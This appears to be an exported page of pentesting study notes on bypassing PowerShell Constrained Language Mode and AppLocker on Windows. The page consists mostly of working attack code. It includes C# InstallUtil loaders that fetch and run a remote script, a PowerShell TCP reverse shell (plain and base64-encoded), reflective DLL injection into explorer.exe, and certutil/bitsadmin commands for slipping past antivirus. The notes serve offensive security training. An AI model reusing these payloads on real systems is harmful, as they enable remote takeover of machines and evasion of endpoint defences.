<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>CLM</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>CLM</h1><br/><p><h2>Intro</h2><ul><li>• <small>• ConstrainedLanguage mode (CLM) with PowerShell version 3.0.</small></li><li><small>In Constrained Language Mode, certain cmdlets and language elements in PowerShell are restricted or disabled to prevent potentially harmful operations. This includes limiting access to file system operations, registry access, and other system resources.</small></li><li><small>When AppLocker (or WDAC) is enforcing whitelisting rules against</small></li><li><small>PowerShell scripts, ConstrainedLanguage is enabled as well.</small></li><li><small>$ExecutionContext.SessionState.LanguageMode</small></li></ul></p><p></p><p><h2>Recon</h2></p><p></p><p><strong>$ExecutionContext.SessionState.LanguageMode</strong></p><p></p><p><h2>Bypass CLM - downgrade version</h2></p><p></p><p>powershell -version 2 </p><p><h2>Bypass CLM - custom runspaces</h2> <ul><li>compile code inside custom runspace</li><li>on visual studio<ul><li>solution explorer=&gt; class view =&gt; right click references</li><li>browse<ul><li>C:\Windows\assembly\GAC_MSIL\System.Management.Automation\1.0.0.0__31bf3856ad364e35</p><p></li></ul></li></ul></li></ul><div class="codebox"><pre><span style="color:#ff9d00;font-weight:700">using</span> System;<br /><span style="color:#ff9d00;font-weight:700">using</span> System.Management.Automation;<br /><span style="color:#ff9d00;font-weight:700">using</span> System.Management.Automation.Runspaces;<br /><span style="color:#ff9d00;font-weight:700">using</span> System.Configuration.Install;<br /><br /><span style="color:#ff9d00;font-weight:700">namespace</span> Bypass<br />{<br />    <span style="color:#ff9d00;font-weight:700">class</span> Program<br />    {<br />        <span style="color:#ff9d00;font-weight:700">static</span> <span style="color:#ff9d00;font-weight:700">void</span> Main(<span style="color:#7f0044;font-weight:400">string</span>[] args)<br />        {<br />            Console.WriteLine(<span style="color:#3ad900;font-weight:400">&quot;This is the main method which is a decoy&quot;</span>);<br />        }<br />    }<br /><br />    [System.ComponentModel.RunInstaller(<span style="color:#ff0044;font-weight:400">true</span>)]<br />    <span style="color:#ff9d00;font-weight:700">public</span> <span style="color:#ff9d00;font-weight:700">class</span> Sample : System.Configuration.Install.Installer<br />    {<br />        <span style="color:#ff9d00;font-weight:700">public</span> <span style="color:#ff9d00;font-weight:700">override</span> <span style="color:#ff9d00;font-weight:700">void</span> Uninstall(System.Collections.IDictionary savedState)<br />        {<br /><span style="color:#0088ff;font-weight:400">//            String cmd = &quot;$ExecutionContext.SessionState.LanguageMode | Out-File -FilePath C:\\Tools\\test.txt&quot;;</span><br />            String cmd=<span style="color:#3ad900;font-weight:400">&quot;IEX(New-Object Net.WebClient).DownloadString(&#39;http://192.168.45.183/shell.ps1&#39;)&quot;</span>;<br />            Runspace rs = RunspaceFactory.CreateRunspace();<br />            rs.Open();<br /><br />            PowerShell ps = PowerShell.Create();<br />            ps.Runspace = rs;<br /><br />            ps.AddScript(cmd);<br /><br />            ps.Invoke();<br /><br />            rs.Close();<br />        }<br />    }<br />}</pre></div></p><p></p><p></p><p>shell.ps1</p><p><div class="codebox"><pre><span style="color:#0088ff;font-weight:400">$client</span> <span style="color:#ff9d00;font-weight:700">=</span> <span style="color:#ff9d00;font-weight:700">New-Object</span> System.Net.Sockets.TCPClient(<span style="color:#333333;font-weight:400">&#39;192.168.45.183&#39;</span>,<span style="color:#333333;font-weight:400">443</span>);<span style="color:#0088ff;font-weight:400">$stream</span> <span style="color:#ff9d00;font-weight:700">=</span><span style="color:#0088ff;font-weight:400">$client</span>.GetStream();[<span style="color:#7f0044;font-weight:400">byte</span>[]]<span style="color:#0088ff;font-weight:400">$bytes</span> <span style="color:#ff9d00;font-weight:700">=</span> <span style="color:#333333;font-weight:400">0</span>..<span style="color:#333333;font-weight:400">65535</span>|<span style="color:#ff9d00;font-weight:700">%</span>{<span style="color:#333333;font-weight:400">0</span>};<span style="color:#ff9d00;font-weight:700">while</span>((<span style="color:#0088ff;font-weight:400">$i</span> <span style="color:#ff9d00;font-weight:700">=</span> <span style="color:#0088ff;font-weight:400">$stream</span>.Read(<span style="color:#0088ff;font-weight:400">$bytes</span>, <span style="color:#333333;font-weight:400">0</span>,<span style="color:#0088ff;font-weight:400">$bytes</span>.Length)) <span style="color:#ff9d00;font-weight:700">-ne</span> <span style="color:#333333;font-weight:400">0</span>){;<span style="color:#0088ff;font-weight:400">$data</span> <span style="color:#ff9d00;font-weight:700">=</span> (<span style="color:#ff9d00;font-weight:700">New-Object</span> <span style="color:#333333;font-weight:400">-TypeName</span> System.Text.ASCIIEncoding).GetString(<span style="color:#0088ff;font-weight:400">$bytes</span>,<span style="color:#333333;font-weight:400">0</span>, <span style="color:#0088ff;font-weight:400">$i</span>);<span style="color:#0088ff;font-weight:400">$sendback</span> <span style="color:#ff9d00;font-weight:700">=</span> (<span style="color:#ff9d00;font-weight:700">iex</span> <span style="color:#0088ff;font-weight:400">$data</span> <span style="color:#333333;font-weight:400">2</span>&gt;&amp;<span style="color:#333333;font-weight:400">1</span> | <span style="color:#ff9d00;font-weight:700">Out-String</span>);<span style="color:#0088ff;font-weight:400">$sendback2</span> <span style="color:#ff9d00;font-weight:700">=</span> <span style="color:#0088ff;font-weight:400">$sendback</span> <span style="color:#ff9d00;font-weight:700">+</span> <span style="color:#333333;font-weight:400">&#39;PS &#39;</span> <span style="color:#ff9d00;font-weight:700">+</span> (<span style="color:#ff9d00;font-weight:700">pwd</span>).Path <span style="color:#ff9d00;font-weight:700">+</span> <span style="color:#333333;font-weight:400">&#39;&gt; &#39;</span>;<span style="color:#0088ff;font-weight:400">$sendbyte</span> <span style="color:#ff9d00;font-weight:700">=</span>([text.encoding]<span style="color:#ff9d00;font-weight:700">::</span>ASCII).GetBytes(<span style="color:#0088ff;font-weight:400">$sendback2</span>);<span style="color:#0088ff;font-weight:400">$stream</span>.<span style="color:#ff9d00;font-weight:700">Write</span>(<span style="color:#0088ff;font-weight:400">$sendbyte</span>,<span style="color:#333333;font-weight:400">0</span>,<span style="color:#0088ff;font-weight:400">$sendbyte</span>.Length);<span style="color:#0088ff;font-weight:400">$stream</span>.Flush()};<span style="color:#0088ff;font-weight:400">$client</span>.Close()</pre></div><ul><li>However, we are still hindered by AppLocker&#39;s C# executable rules.</li></ul></p><p></p><p><div class="codebox"><pre>String cmd = <span style="color:#3ad900;font-weight:400">&quot;$bytes = (New-Object System.Net.WebClient).DownloadData(&#39;http://192.168.45.456/met.dll&#39;);(New-Object System.Net.WebClient).DownloadString(&#39;http://192.168.45.456/Invoke-ReflectivePEInjection.ps1&#39;) | IEX; $procid = (Get-Process -Name explorer).Id; Invoke-ReflectivePEInjection -PEBytes $bytes -ProcId $procid&quot;</span>;</pre></div></p><p><h2>Living off the land</h2><ul><li>misuse native windows application</li><li>example: installutil.exe<ul><li></li></ul></li></ul><img src="images/17-1.png" alt="images/17-1.png" /><ul><li></li></ul><div class="codebox"><pre><span style="color:#ff9d00;font-weight:700">using</span> System;<br /><span style="color:#ff9d00;font-weight:700">using</span> System.Management.Automation;<br /><span style="color:#ff9d00;font-weight:700">using</span> System.Management.Automation.Runspaces;<br /><span style="color:#ff9d00;font-weight:700">using</span> System.Configuration.Install;<br /><br /><span style="color:#ff9d00;font-weight:700">namespace</span> Bypass<br />{<br />    <span style="color:#ff9d00;font-weight:700">class</span> Program<br />    {<br />        <span style="color:#ff9d00;font-weight:700">static</span> <span style="color:#ff9d00;font-weight:700">void</span> Main(<span style="color:#7f0044;font-weight:400">string</span>[] args)<br />        {<br />            Console.WriteLine(<span style="color:#3ad900;font-weight:400">&quot;This is the main method which is a decoy&quot;</span>);<br />        }<br />    }<br /><br />    [System.ComponentModel.RunInstaller(<span style="color:#ff0044;font-weight:400">true</span>)]<br />    <span style="color:#ff9d00;font-weight:700">public</span> <span style="color:#ff9d00;font-weight:700">class</span> Sample : System.Configuration.Install.Installer<br />    {<br />        <span style="color:#ff9d00;font-weight:700">public</span> <span style="color:#ff9d00;font-weight:700">override</span> <span style="color:#ff9d00;font-weight:700">void</span> Uninstall(System.Collections.IDictionary savedState)<br />        {<br />            <span style="color:#0088ff;font-weight:400">//String cmd = &quot;$ExecutionContext.SessionState.LanguageMode | Out-File -FilePath C:\\Tools\\test.txt&quot;;</span><br />            String cmd=<span style="color:#3ad900;font-weight:400">&quot;powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADQANQAuADIAMwA0ACIALAA5ADAAMAAxACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA==&quot;</span>;<br />            Runspace rs = RunspaceFactory.CreateRunspace();<br />            rs.Open();<br /><br />            PowerShell ps = PowerShell.Create();<br />            ps.Runspace = rs;<br /><br />            ps.AddScript(cmd);<br /><br />            ps.Invoke();<br /><br />            rs.Close();<br />        }<br />    }<br />}</pre></div><ul><li>bypass disk problem (encode file)<ul><li>To attempt to bypass anitvirus, we are going to obfuscate the executable while it is being downloaded with Base64 encoding and then decode it on disk. Well use the native certutil tool to perform the encoding and decoding and bitsadmin454 for the downloading.<ul><li>certutil -encodec C : \Users\Offsec\source\repos\Bypass\Bypass\bin\x64\Release\Bypass.exe file.txt</li><li>bitsadmin /Transfer myJob <a href="http://192.168.119.120/file.txt">http://192.168.119.120/file.txt</a> C:\Users\student\enc.txt</li><li>certutil -decode enc.txt Bypass.exe</li></ul></li></ul></li><li>limitations:<ul><li>rely on one binary</li><li>if InstallUtil was blocked by applocker rules</li></ul></li></ul></p><p></p><p><h2>Reflective dll injection</h2><ul><li>use reflective dll technique with </li></ul></p><p></p><p></p><p><strong>Obfuscation</strong></p><p><ul><li><a href="https://github.com/XenocodeRCE/neo-ConfuserEx">https://github.com/XenocodeRCE/neo-ConfuserEx</a><ul><li>obfuscate .NET applications </li><li><a href="https://github.com/calebstewart/bypass-clm">https://github.com/calebstewart/bypass-clm</a></li></ul></li><li></li></ul><img src="images/17-2.png" alt="images/17-2.png" /></p></div>
</body>
</html>
